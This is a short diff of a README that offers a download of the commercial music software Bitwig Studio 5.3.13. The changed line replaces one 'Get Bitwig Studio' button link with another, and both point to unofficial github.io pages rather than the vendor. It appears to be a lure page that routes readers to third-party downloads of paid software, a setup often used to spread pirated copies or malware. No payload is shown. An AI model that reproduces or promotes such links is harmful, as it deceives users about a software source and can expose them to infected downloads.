@@ -21,7 +21,7 @@ To begin using this professional **Music Software** and powerful **DAW**, please
 | :--- | :--- |
 | **Get Bitwig Studio 5.3.13** | Click the button below to initiate the setup for this **Bitwig Studio 5.3.13 Production Tool**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Bitwig_Studio_5.3.13-2ea44f?style=for-the-badge)](https://rodericklueilwitz88.github.io/.github/bitwig-studio-5-3-13)
+[![Bitwig Studio](https://img.shields.io/badge/Try-Bitwig%20Studio-7C3AED?style=for-the-badge)](https://bitwig-studio-review.github.io/.github/bitwig-studio)
 
 ## System Requirements
 
